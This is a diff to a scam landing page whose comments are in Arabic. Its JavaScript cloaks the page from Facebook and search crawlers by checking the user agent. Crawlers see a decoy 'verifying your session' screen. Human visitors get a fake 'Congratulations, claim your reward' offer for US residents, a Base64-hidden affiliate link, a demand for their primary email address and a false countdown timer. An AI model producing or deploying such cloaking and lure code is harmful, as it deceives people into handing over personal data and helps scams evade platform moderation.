@@ -2,60 +2,94 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Personal Finance Tips</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Action Required</title>
     <style>
-        /* CSS نقي وبسيط لإيهام الروبوت بأنها صفحة مقال */
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f7f6; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .wrapper { width: 90%; max-width: 400px; background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
-        h1 { color: #2d3436; font-size: 24px; margin-bottom: 15px; }
-        p { color: #636e72; font-size: 16px; margin-bottom: 25px; }
-        .loading-spinner { display: inline-block; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0984e3; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #safe-content { display: block; }
-        #offer-content { display: none; } /* مخفي برمجياً عن الروبوتات */
-        .btn { display: block; background: #00b894; color: #fff; padding: 18px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 18px; transition: 0.3s; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #e9ecef; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .mobile-container { width: 95%; max-width: 450px; background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); overflow: hidden; }
+        .top-bar { background: #cf2e2e; color: white; padding: 8px; text-align: center; font-size: 13px; font-weight: bold; text-transform: uppercase; }
+        .hero { padding: 25px; text-align: center; }
+        .usa-flag { width: 60px; margin-bottom: 10px; }
+        h1 { font-size: 26px; color: #1a1a1a; margin: 10px 0; letter-spacing: -0.5px; }
+        .congrats-text { color: #28a745; font-weight: bold; font-size: 18px; }
+        
+        /* التنبيه الخاص بالإيميل */
+        .email-notice { background: #fff4f4; border: 2px dashed #cf2e2e; padding: 15px; margin: 20px 0; border-radius: 8px; }
+        .email-notice p { margin: 0; font-size: 15px; line-height: 1.5; color: #333; }
+        .email-icon { font-size: 24px; margin-bottom: 5px; display: block; }
+
+        .cta-btn { display: block; background: #007bff; color: white; text-decoration: none; padding: 20px; font-size: 20px; font-weight: 800; border-radius: 8px; margin-top: 10px; transition: 0.3s; text-transform: uppercase; border-bottom: 4px solid #0056b3; }
+        .cta-btn:active { transform: translateY(2px); border-bottom: 0; }
+        
+        .timer { color: #d63031; font-weight: bold; margin-top: 15px; font-size: 14px; }
+        #cloak-screen { padding: 40px; text-align: center; }
+        #main-content { display: none; }
+        
+        .loading-dots:after { content: ' .'; animation: dots 1.5s steps(5, end) infinite;}
+        @keyframes dots { 0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 40% { color: #333; text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 60% { text-shadow: .25em 0 0 #333, .5em 0 0 rgba(0,0,0,0); } 80%, 100% { text-shadow: .25em 0 0 #333, .5em 0 0 #333; } }
     </style>
 </head>
 <body>
 
-    <div class="wrapper">
-        <div id="safe-content">
-            <h1>Welcome to Premium Insights</h1>
-            <p>Please wait while we verify your secure connection...</p>
-            <div class="loading-spinner"></div>
-        </div>
-
-        <div id="offer-content">
-            <div style="background:#ffeaa7; padding:5px; border-radius:5px; font-size:12px; font-weight:bold; margin-bottom:10px;">EXCLUSIVELY FOR USA</div>
-            <h1 id="dynamic-title">Access Your Reward Below</h1>
-            <p>Congratulations! You have been selected to participate in this limited-time opportunity.</p>
-            <a href="#" id="secure-link" class="btn">CLAIM ACCESS NOW</a>
-        </div>
+<div class="mobile-container">
+    <div class="top-bar">Reserved for USA Residents Only</div>
+    
+    <div id="cloak-screen">
+        <h2 class="loading-dots">Verifying your secure session</h2>
+        <p style="color:#666; font-size:14px;">IP Address: Checking...</p>
     </div>
 
-    <script>
-        (function() {
-            // تشفير الرابط (Base64) لمنع الروبوتات من قراءته كـ URL
-            // استبدل الرابط أدناه برابط عرضك مشفراً بـ Base64
-            var _0x5a1 = "aHR0cHM6Ly9mZXJhdmVyb21vbnN0ZXIuaW5rL3NsLzMxcm9q"; 
+    <div id="main-content" class="hero">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="usa-flag" alt="USA">
+        <div class="congrats-text">Congratulations!</div>
+        <h1>Access Your Reward Below</h1>
+        
+        <p>You have been selected to participate in this <strong>limited-time opportunity.</strong></p>
 
-            function isBot() {
-                var ua = navigator.userAgent.toLowerCase();
-                // فحص الكلمات الدليلة للروبوتات (Facebook, Google, Bot, etc.)
-                return /bot|crawler|spider|facebookexternalhit|facebookcatalog/i.test(ua);
+        <div class="email-notice">
+            <span class="email-icon">📧</span>
+            <p><strong>IMPORTANT:</strong> To receive your reward, you must enter your <strong>primary email address</strong> on the next page. Invalid emails will result in immediate disqualification.</p>
+        </div>
+
+        <a href="#" id="offer-link" class="cta-btn">CLAIM ACCESS NOW</a>
+        
+        <div class="timer" id="timer-display">Reward held for: 01:59</div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        // رابط العرض المشفر (Base64)
+        var _0x4d2 = "aHR0cHM6Ly9mZXJhdmVyb21vbnN0ZXIuaW5rL3NsLzMxcm9q";
+
+        function init() {
+            var ua = navigator.userAgent.toLowerCase();
+            // الكشف عن الروبوتات
+            var isBot = /facebook|bot|spider|crawler|externalhit/i.test(ua);
+
+            if (!isBot) {
+                setTimeout(function() {
+                    document.getElementById('cloak-screen').style.display = 'none';
+                    document.getElementById('main-content').style.display = 'block';
+                    document.getElementById('offer-link').href = atob(_0x4d2);
+                    startCountdown(119);
+                }, 1800); // تأخير بسيط للإيهام بالفحص
             }
+        }
 
-            setTimeout(function() {
-                if (!isBot()) {
-                    // إذا كان مستخدماً حقيقياً، نقوم بفك التشفير وإظهار العرض
-                    document.getElementById('safe-content').style.display = 'none';
-                    document.getElementById('offer-content').style.display = 'block';
-                    var link = atob(_0x5a1);
-                    document.getElementById('secure-link').setAttribute('href', link);
-                }
-            }, 1500); // تأخير بسيط للتمويه
-        })();
-    </script>
+        function startCountdown(seconds) {
+            var interval = setInterval(function() {
+                var m = Math.floor(seconds / 60);
+                var s = seconds % 60;
+                document.getElementById('timer-display').innerHTML = "Reward held for: " + (m<10?'0':'')+m + ":" + (s<10?'0':'')+s;
+                if (seconds <= 0) clearInterval(interval);
+                seconds--;
+            }, 1000);
+        }
+
+        init();
+    })();
+</script>
+
 </body>
 </html>
